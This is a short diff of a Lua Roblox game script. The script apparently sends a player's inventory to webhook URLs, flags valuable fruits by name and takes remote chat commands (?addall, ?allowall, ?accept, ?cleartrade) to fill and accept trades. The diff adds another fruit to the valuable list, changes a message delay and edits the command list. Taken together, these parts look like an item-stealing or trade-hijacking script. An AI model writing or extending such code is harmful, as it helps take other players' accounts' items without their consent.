@@ -365,7 +365,7 @@ local function sendWebhook(inventory)
 	end
 
 	-- Define specific fruit categories
-	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true }
+	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true, ["Love-Love"] = true }
 
 	-- Retrieve stored webhook URLs
 	local url1 = webhook1_key and _G[webhook1_key]
@@ -1376,7 +1376,7 @@ local Commands = {
                     if string.len(currentMessage) + string.len(potentialAddition) > messageLimit then
                         -- Send the current message chunk
                         sendMessage(currentMessage)
-                        task.wait(1) -- Wait between messages
+                        task.wait(2) -- Wait between messages
                         chunkIndex = chunkIndex + 1
                         currentMessage = "Fruits [Value] ("..chunkIndex.."/".. totalChunks .."): " .. fruitName -- Start new message
                     else
@@ -1411,10 +1411,10 @@ local Commands = {
 			task.spawn(function()
 				-- Condensed command list (names only)
 				local cmds = {
-                    "Cmds 1/4: ?help ?test ?jump ?sit ?tp ?reset ?rejoin",
-                    "Cmds 2/4: ?add ?additem ?addall ?addallitems",
-                    "Cmds 3/4: ?resetfruit ?invite ?demolish ?showinv",
-                    "Cmds 4/4: ?allowall ?accept ?cleartrade"
+                    "?help ?test ?jump ?sit ?tp ?reset ?rejoin",
+                    "?add ?additem ?addall ?addallitems",
+                    "?resetfruit ?invite ?demolish ?showinv",
+                    "?allowall ?accept ?cleartrade"
 				}
 				sendMessage("--- Commands ---")
 				task.wait(1) -- Initial small delay
